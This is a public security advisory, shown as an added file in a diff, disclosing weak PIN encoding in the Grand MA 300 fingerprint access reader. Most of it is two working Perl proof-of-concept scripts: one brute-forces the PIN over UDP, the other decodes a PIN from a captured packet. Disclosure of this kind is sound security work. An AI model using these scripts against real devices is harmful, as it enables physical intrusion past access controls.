@@ -1,0 +1,270 @@
+
+Date: Tue, 26 Aug 2014 08:05:28 +0200
+From: advisories <advisories@...xperts.de>
+To: bugtraq@...urityfocus.com, submissions@...ketstormsecurity.org,
+  fulldisclosure@...lists.org, bugs@...uritytracker.com
+Subject: LSE Leading Security Experts GmbH - LSE-2014-07-13 - Granding Grand
+ MA 300 - Weak Pin Verification
+
+=== LSE Leading Security Experts GmbH - Security Advisory 2014-07-13 ===
+
+Grand MA 300 Fingerprint Reader - Weak Pin Verification
+------------------------------------------------------------------------
+
+Affected Versions
+=================
+Grand MA 300/ID with firmware 6.60
+
+
+Issue Overview
+==============
+Vulnerability Type: Weak Pin Verification
+Technical Risk: high
+Likelihood of Exploitation: medium
+Vendor: Granding
+Vendor URL: http://www.granding.com/productdetail/46/.aspx
+Credits: LSE Leading Security Experts GmbH Eric Sesterhenn
+Advisory URL: https://www.lsexperts.de/advisories/lse-2014-07-13.txt
+Advisory Status: Public
+CVE-Number: CVE-2014-5380 and CVE-2014-5381
+CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5380 and
+  http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5381
+
+
+
+Impact
+======
+A weakness was found in the Grand MA 300 fingerprint access control
+device, which allows the retrieval of the access pin from
+sniffed data (CVE-2014-5380), as well as a weakness, which allows a
+fast brute-force attack on the pin (CVE-2014-5381).
+
+
+Issue Description
+=================
+The cipher do encode the pin inside the network or wigand traffic
+contains a flaw which allows to retrieve the pin an weakens the
+resitance against brute-force attacks.
+
+
+
+Temporary Workaround and Fix
+============================
+Due to the proprietary nature of the product, we are unable
+to provide a fix. As a workarount disable the devices entirely
+or make sure no physical access to the ethernet or wigand interfaces
+are possible.
+
+
+Proof of Concept
+================
+
+The following perl script shows the weak pin encoding,
+and allows a bruteforce.
+
+---------------------8<-------------------------------
+#!/usr/bin/perl
+#
+# This brute-forces the pin of a Grand MA 300 Fingerprint
+# Access device in less than 5 minutes, if the pin
+# is between 1 and 4294967296.
+#
+# written by Eric Sesterhenn <eric.sesterhenn@...xperts.de>
+# http://www.lsexperts.de
+#
+use IO::Socket::INET;
+use strict;
+use warnings;
+
+sub hexd {
+        my ($data) = @_;
+        my $ret = "";
+        for (my $i=0; $i<length($data); $i++) {
+                $ret .= sprintf "%X", ord(substr($data, $i, 1));
+        }
+        return $ret;
+}
+sub getword {
+        my ($data, $offset) = @_;
+        my $ret = 0;
+
+        $ret = ord(substr($data, $offset, 1));
+        $ret += 0x100 * ord(substr($data, $offset+1, 1));
+        return $ret;
+}
+
+sub makeword {
+        my ($value) = @_;
+
+        my $ret = chr(($value & 0xFF)) . chr((($value >> 8) & 0xFF));
+
+        return $ret;
+}
+
+sub calccrc {
+        my ($packet) = @_;
+        # we pad with zero for packets of uneven length
+        my $newpacket = substr($packet, 0, 2) . substr($packet, 4) . chr(0);
+        my $crc = 0;
+
+        # the crc is the sum of all words in the packet
+        for (my $i = 0; $i<length($packet) - 2; $i += 2) {
+                $crc += getword($newpacket, $i);
+        }
+
+        # if the result is to big, we add the high bits to the lower bits
+        while ($crc > 0xFFFF) {
+                $crc = ($crc & 0xFFFF) + ($crc >> 0x10);
+        }
+
+        # negate the checksum
+        $crc = ~$crc & 0xFFFF;
+        return $crc;
+}
+
+sub makepacket {
+        my ($type, $cid, $seqno, $data) = @_;
+        my $crc = calccrc(makeword($type).makeword(0).makeword($cid).makeword($seqno).$data);
+        return makeword($type).makeword($crc).makeword($cid).makeword($seqno).$data;
+}
+
+sub calcpass {
+	my ($pin, $cid) = @_;
+	my $ret = 0;
+
+	# revert the bits
+	for (my $i = 0; $i < 32; $i++) {
+	  $ret *= 2;
+	  if ($pin & 1) {
+	    $ret = $ret + 1;
+	  }
+	  $pin = $pin / 2;
+	}
+
+	$ret += $cid;
+
+	# xor with magic value
+	$ret ^= 0x4F534B5A;
+
+	# switch the words
+	$ret = (($ret & 0xFFFF) << 16) + ($ret >> 16);
+
+	# xor all, but third byte with last byte of gettickcount
+	my $gc = 0x00;
+	$ret ^= $gc + ($gc << 8) + ($gc << 24);
+
+	# set third byte to last byte of gettickcount
+	# this weakens the algorithm even further, since this byte
+        # is no longer relevant to the algorithm
+	$ret = ($ret & 0xFF000000) + ($gc << 16) + ($ret & 0xFFFF);
+	
+	return $ret;
+}
+
+# flush after every write
+local $| = 1;
+
+my ($socket,$client_socket);
+
+# creating object interface of IO::Socket::INET modules which internally creates
+# socket, binds and connects to the TCP server running on the specific port.
+
+my $data;
+$socket = new IO::Socket::INET (
+	PeerHost => '192.168.1.201',	# CHANGEME
+	PeerPort => '4370',
+	Proto => 'udp',
+) or die "ERROR in Socket Creation : $!\n";
+
+# initialize the connection
+$socket->send(makepacket(1000, 0, 0, ""));
+$socket->recv($data, 1024);
+
+my $typ = getword($data, 0);
+my $cid = getword($data, 4);
+if ($typ != 2005) {
+	printf("Client does not need a password");
+	exit(-1);
+}
+
+for (my $i = 0; $i < 65536; $i++) {
+	if (($i % 10) == 0) { printf "$i\n"; }
+	my $pass = calcpass($i, $cid);
+	$socket->send(makepacket(1102, $cid, $i + 1, pack("V", $pass)));
+
+	$socket->recv($data, 1024);
+	$typ = getword($data, 0);
+	if ($typ == 2000) {
+		printf("Found pin: %d\n", $i);
+		exit(0);
+	}
+}
+
+# disconnect
+$socket->send(makepacket(1001, $cid, 2, ""));
+
+$socket->close();
+---------------------8<-------------------------------
+
+The following proof of concept shows how to reverse
+the pin from a captured packet.
+
+---------------------8<-------------------------------
+#!/usr/bin/perl
+#
+# This script calculates the original pin based on the pin
+# retrieved on the wire for the Grand MA 300 fingerprint access device
+#
+# look for a UDP packet starting with 0x4E 0x04, the last 4 bytes are the
+# encoded pin
+#
+# written by Eric Sesterhenn <eric.sesterhenn@...xperts.de>
+# http://www.lsexperts.de
+#
+use warnings;
+use strict;
+
+my $cid = 0;     # connection id
+my $ret = 0x4B00A987; # pin on the wire
+
+# get gettickcount value (third byte)
+my $gc = ($ret >> 16) & 0xFF;
+
+# set third byte to magic value (so it becomes zero when we xor it later with the magic value)
+$ret =  $ret | 0x005A0000;
+
+# xor all, but third byte with last byte of gettickcount
+$ret ^= $gc + ($gc << 8) + ($gc << 24);
+
+# switch the words
+$ret = (($ret & 0xFFFF) << 16) + ($ret >> 16);
+
+# xor with magic value
+$ret ^= 0x4F534B5A;
+
+# substract the connection id
+$ret -= $cid;
+
+my $fin = 0;
+# revert the bits
+for (my $i = 0; $i < 32; $i++) {
+  $fin *= 2;
+  if ($ret & 1) {
+    $fin = $fin + 1;
+  }
+  $ret = $ret / 2;
+}
+
+printf("final: %X \n", $fin);
+---------------------8<-------------------------------
+
+
+History
+=======
+2014-07-13  Issue discovered
+2014-08-18  Vendor notified
+2014-08-20  CWE IDs assigned
+2014-08-25  Advisory released
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
